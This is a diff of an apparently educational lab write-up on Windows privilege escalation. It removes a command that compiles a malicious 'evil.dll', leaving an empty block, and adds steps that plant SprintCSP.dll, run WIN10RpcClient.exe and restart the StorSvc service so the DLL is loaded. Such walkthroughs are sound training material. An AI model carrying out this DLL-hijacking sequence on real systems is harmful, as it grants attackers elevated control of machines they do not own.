@@ -99,6 +99,18 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
 > Compile it:
 
 ```shell
-x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
+
 ```
 
+
+---
+
+> Downloaded the SprintCSP.dll and .exe file. Copy it to \Confluence\bin, and execute the .exe file.
+
+```powershell
+PS C:\Users\Student\Downloads> .\WIN10RpcClient.exe
+[!] Manual reboot of StorSvc service is required.
+PS C:\Users\Student\Downloads> sc stop StorSvc
+PS C:\Users\Student\Downloads> sc start StorSvc
+PS C:\Users\Student\Downloads>    
+```
